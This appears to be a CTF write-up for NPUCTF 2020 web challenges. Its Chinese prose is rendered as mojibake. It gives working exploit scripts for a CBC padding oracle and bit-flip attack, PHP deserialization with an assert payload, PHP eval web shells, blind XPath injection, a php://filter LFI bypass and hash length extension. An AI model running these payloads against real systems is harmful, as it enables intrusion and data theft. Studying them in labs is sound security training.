    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-webğŸ•"><a href="#1-webğŸ•" class="headerlink" title="1.webğŸ•"></a>1.webğŸ•</h3><p>å½“æ—¶å†™è¿™é“é¢˜ï¼ŒçŸ¥é“åªçŸ¥é“æ˜¯CBCå­—èŠ‚åè½¬æ”»å‡»ã€‚</p><p>åé¢çœ‹WPæ‰å‘ç°è€ƒç‚¹</p><ol>
<li>cbc padding oracle</li>
<li>cbc å­—èŠ‚ç¿»è½¬</li>
</ol><p>index.phpæºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//å®šä¹‰åŠ å¯†æ–¹å¼</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//å®šä¹‰å¯†é’¥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>





<p>ä»ä¸Šé¢ä»£ç å¯çŸ¥128ä½çš„cbcï¼Œblocksizeæ˜¯16å­—èŠ‚ï¼ŒåŠ å¯†IVå·²çŸ¥ï¼ŒsecretæœªçŸ¥ï¼Œæˆ‘ä»¬è¿˜çŸ¥é“è§£å¯†æ˜¯å¦æˆåŠŸï¼Œå¯†æ–‡ï¼Œæˆ‘ä»¬åˆå¯ä»¥æ§åˆ¶å¯†æ–‡å’Œè§£å¯†çš„IVï¼Œå¯ä»¥ä½¿ç”¨padding oracleçˆ†å‡ºæ˜æ–‡ã€‚</p>
<p>å…·ä½“çš„<a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">æ”»å‡»ç†è®º</a></p>
<p><a href="https://glotozz.github.io/2020/04/20/NPUCTF-wp/#web" target="_blank" rel="noopener">glotozz</a>å¸ˆå‚…çš„exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://ha1cyon-ctf.fun:30141/index.php?source&amp;method=decrypt'</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line">l = [<span class="number">0</span>] * N</span><br><span class="line">iv = <span class="string">'6666666666666666'</span></span><br><span class="line">tmp_iv = <span class="string">''</span></span><br><span class="line">out = [<span class="number">0</span>] * N</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        l[N-i] = c</span><br><span class="line">        tmp_iv = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> l:</span><br><span class="line">            tmp_iv += chr(m)</span><br><span class="line">        <span class="keyword">print</span> base64.b64encode(tmp_iv)</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'iv'</span>: tmp_iv,</span><br><span class="line">            <span class="string">'data'</span>: <span class="string">'ly7auKVQCZWum/W/4osuPA=='</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        data = requests.post(url, data=data).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'False'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">            out[N-i] = c ^ i</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(i):</span><br><span class="line">                l[N-y<span class="number">-1</span>] = out[N-y<span class="number">-1</span>] ^ (i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">    out[i] = out[i] ^ ord(iv[i])</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> out:</span><br><span class="line">    s += chr(c)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºæ˜æ–‡ <code>FlagIsHere.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);    <span class="comment">//$fl4g</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"6666666"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iv</span><span class="params">()</span></span>&#123;    <span class="comment">//ç”Ÿæˆéšæœºåˆå§‹å‘é‡IV</span></span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala = <span class="string">'piapiapiapia'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'Identity'</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">'iv'</span>] = get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'Identity'</span>] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[<span class="string">'iv'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($_SESSION[<span class="string">'iv'</span>]).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    $tmp_id = openssl_decrypt(base64_decode($_SESSION[<span class="string">'Identity'</span>]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[<span class="string">'iv'</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $tmp_id.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($tmp_id ===<span class="string">'weber'</span>)<span class="keyword">die</span>($fl4g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>CBCå­—èŠ‚åè½¬æ”»å‡»</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</span><br><span class="line"></span><br><span class="line">source_str = <span class="string">'piapiapiapia'</span> + <span class="number">4</span> * <span class="string">'\x04'</span></span><br><span class="line">target_srt = <span class="string">'weber'</span> + <span class="number">11</span> * <span class="string">'\x0b'</span></span><br><span class="line">token = <span class="string">'sS8OuVOl9tyCkzAzsabGBA=='</span>  <span class="comment"># ä½ è·å¾—çš„åˆå§‹IVçš„base64encodeå€¼</span></span><br><span class="line">token = list(b64.b64decode(token))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(target_srt)):</span><br><span class="line">    token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))</span><br><span class="line"><span class="keyword">print</span> b64.b64encode(<span class="string">''</span>.join(token))</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç½‘ç›˜åœ°å€ä¸‹è½½å¾—åˆ°<code>HelloWorld.class</code>ï¼Œ<code>jd-gui</code>åç¼–è¯‘å¾—åˆ°byteæµ,åé¢pythonè§£ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(bytearray([<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span> ]))</span><br></pre></td></tr></table></figure>

<h3 id="2-ReadlezPHP"><a href="#2-ReadlezPHP" class="headerlink" title="2.ReadlezPHP"></a>2.ReadlezPHP</h3><p>çœ‹æºç ï¼Œè·³è½¬åˆ°<code>/time.php?source</code>å¾—åˆ°æºç </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">#error_reporting(0);</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $a;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $b;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $a = <span class="keyword">$this</span>-&gt;a;</span></span><br><span class="line"><span class="php">        $b = <span class="keyword">$this</span>-&gt;b;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $b($a);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$c = <span class="keyword">new</span> HelloPhp;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span></span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„ååºåˆ—åŒ–ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½ç”¨ <code>eval</code> å› ä¸ºevalæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢« <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">å¯å˜å‡½æ•°</a> è°ƒç”¨ã€‚</p>
<p>PHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚è¿™æ„å‘³ç€å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚</p>
<p>åœ¨PHP7ä¸­assertå˜æˆäº†ä¸€ç§è¯­è¨€ç»“æ„è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´åƒevalä¸€æ ·ä¸æ”¯æŒå¯å˜å‡½æ•°ã€‚ä½†æŸå‡ ä¸ªphp7ç‰ˆæœ¬æ”¯æŒå¯å˜å‡½æ•°ã€‚</p>
<p>é¢˜ç›®è¿™ä¸ª7.0.33ç‰ˆæœ¬æ­£å¥½å¯ä»¥.</p>
<p>æ„é€ ååºåˆ—åŒ–payloadï¼Œæœ¬åœ°æµ‹è¯•æˆåŠŸï¼Œä½†æ‰“è¿‡å»å‘½ä»¤æ²¡æ‰§è¡Œã€‚æ€€ç–‘æ˜¯è¢«ç¦ç”¨äº†ç³»ç»Ÿå‡½æ•°ï¼Œæ‰€ä»¥æ„é€ payloadæŸ¥çœ‹phpinfo();</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$o-&gt;a = <span class="string">'phpinfo()'</span>;</span><br><span class="line">$o-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($o));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200527184236232.png" alt="image-20200527184236232"></p>
<p>è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯å†™ä¸ªé©¬ä¸Šå»ï¼Œç„¶åç”¨å…¶ä»–æ–¹æ³•bypass</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$o-&gt;a = <span class="string">'file_put_contents("1.php", "&lt;?php eval(\$_REQUEST[\'a\']); ?&gt;")'</span>;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆ©ç”¨èšå‰‘æ’ä»¶ç›´æ¥ç»•è¿‡</p>
<p>æœ€ååœ¨ç¯å¢ƒå˜é‡ä¸­æ‰¾åˆ°äº†flag</p>
<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200527191351755.png" alt="image-20200527191351755"></p>
<h3 id="3-ezlogin"><a href="#3-ezlogin" class="headerlink" title="3.ezlogin"></a>3.ezlogin</h3><p>å¼±å£ä»¤ï¼Œç›´æ¥è®¿é—®admin.php,éƒ½æ²¡å•¥å‘ç°ï¼Œåé¢æŠ“åŒ…çœ‹åˆ°æ˜¯XMLæ ¼å¼æäº¤ï¼Œè€ƒè™‘XXEæˆ–XPATHæ³¨å…¥</p>
<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200527192234895.png" alt="image-20200527192234895"></p>
<p>åé¢å‘ç°ä¸€ä¸ªä¼šè¯åªæœ‰15ç§’ï¼Œåªèƒ½å†™è„šæœ¬äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">session = requests.session()</span><br><span class="line">base_url = <span class="string">'http://d13a21db-47ab-4bae-a43f-86d733871552.node3.buuoj.cn/'</span></span><br><span class="line">payload = <span class="string">"' or substring(&#123;target&#125;,&#123;index&#125;,1)='&#123;char&#125;' or '"</span></span><br><span class="line"></span><br><span class="line">chars = string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csrf</span><span class="params">()</span>:</span></span><br><span class="line">    res = session.get(base_url, headers=&#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'</span>,</span><br><span class="line">                                         <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=5d86406434bb835c822991118a6a8eee0'</span>&#125;).text</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">'&lt;input.*value="(.*?)"./&gt;'</span>, res)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ³¨å…¥payload</span></span><br><span class="line">target = <span class="string">'count(/*)=1'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target = <span class="string">'count(/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*)=2'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=2'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=3'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[1])'</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[2])'</span></span><br><span class="line"><span class="comment">#guest</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[3])'</span></span><br><span class="line"><span class="comment">#e10adc3949ba.......</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[2]/*[2])'</span></span><br><span class="line"><span class="comment">#adm1n</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[2]/*[3])'</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">'&lt;username&gt;&#123;username&#125;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;token&#125;&lt;/token&gt;'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'</span>,</span><br><span class="line">           <span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>,</span><br><span class="line">           <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=0f91e551561497454d0b8e91253ca104'</span>&#125;</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        temp_payload = payload.format(target=target, index=str(i), char=j)</span><br><span class="line"></span><br><span class="line">        token = get_csrf()</span><br><span class="line"></span><br><span class="line">        temp_data = data.format(username=temp_payload, token=token)</span><br><span class="line">        res = session.post(url=base_url+<span class="string">'login.php'</span>,</span><br><span class="line">                           data=temp_data, headers=headers)</span><br><span class="line">        <span class="comment"># print(temp_data)</span></span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="comment"># print(len(res.text))</span></span><br><span class="line">        <span class="keyword">if</span> len(res.text) == <span class="number">5</span>:</span><br><span class="line">            result += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°å¯†ç md5è§£å¯†å¾—åˆ°å¯†ç  <code>gtfly123</code>ï¼Œç™»é™†åè§‚å¯Ÿåˆ°urlä¸­<code>?file=welcome</code></p>
<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200527205557544.png" alt="image-20200527205557544"></p>
<p>ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>ä½†ä½¿ç”¨ä¸€èˆ¬çš„php://filterå‘ç°å…¶è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå°è¯•åå‘ç°è¿‡æ»¤äº†ä¸€ä¸‹å…³é”®å­—ï¼š<code>php: .php read base</code></p>
<p>å¹¶ä¸”è¿”å›çš„å†…å®¹ä¸­ä¸èƒ½å«æœ‰flagå­—ç¬¦ä¸²ï¼Œfuzzåå‘ç°å…¶æ²¡æœ‰è¿‡æ»¤å¤§å°å†™ï¼Œé‚£ä¹ˆç”¨å¤§å†™ç»•è¿‡åè®®ï¼Œreadå¯çœç•¥ï¼Œç¼–ç æ–¹å¼ä½¿ç”¨rot13ï¼špHp://filter/string.rot13/resource=/flag</p>
<h3 id="4-ezinclude"><a href="#4-ezinclude" class="headerlink" title="4.ezinclude"></a>4.ezinclude</h3><p>æ ¹æ®hint        md5($secret.$name)===$passå¯ä»¥çŸ¥é“è¿™é¢˜æ˜¯ä¸ªhashé•¿åº¦æ‰©å±•æ”»å‡» ä½†æ˜¯ï¼Œçœ‹åˆ°å…¶ä»–å¸ˆå‚…æœ‰ä¸ªéé¢„æœŸè§£</p>
<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200527214601299.png" alt="image-20200527214601299"></p>
<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200527214620796.png" alt="image-20200527214620796"></p>
<p>æ­£å¸¸çš„è§£æ³•æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    data=os.popen(<span class="string">'hashpump -s 6c24bc6e5b7444222bd69cfc90fa536c -d zz -k '</span>+str(i)+<span class="string">' -a zz'</span>).read()</span><br><span class="line">    name=data.split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    password=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>].replace(<span class="string">'\\x'</span>,<span class="string">'%'</span>)</span><br><span class="line">    result=requests.get(<span class="string">'http://ec560480-bfa8-4fda-bb89-116987af030d.node3.buuoj.cn/index.php?name='</span>+password+<span class="string">'&amp;pass='</span>+name).text</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è®¿é—®ä¼šè·³è½¬404ï¼Œæ‰€ä»¥ç”¨Burpå‘åŒ…ã€‚</p>
<p>æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«</p>
<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200528220708064.png" alt="image-20200528220708064"></p>
<p>æ¯”è¾ƒå‘çš„åœ°æ–¹æ˜¯dir.php è¦æ‰«æã€‚å¦‚æœå¾—åˆ°äº†dir.phpï¼Œåº”è¯¥éƒ½ä¼šæƒ³åˆ°ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file_data=&#123;</span><br><span class="line">true<span class="string">'file'</span>: BytesIO(<span class="string">"&lt;?php eval($_POST['a']);"</span>)</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://usrl/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span></span><br><span class="line">r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>ä»dir.phpè·å–ä¸´æ—¶æ–‡ä»¶ågetshell</p>
<p>æœ€åæ˜¯åœ¨phpinfo()é¡µé¢æ‰¾åˆ°flag</p>
<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200528223919475.png" alt="image-20200528223919475"></p>
<h3 id="5-éªŒè¯ğŸ"><a href="#5-éªŒè¯ğŸ" class="headerlink" title="5.éªŒè¯ğŸ"></a>5.éªŒè¯ğŸ</h3><p>å…³é”®æºç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

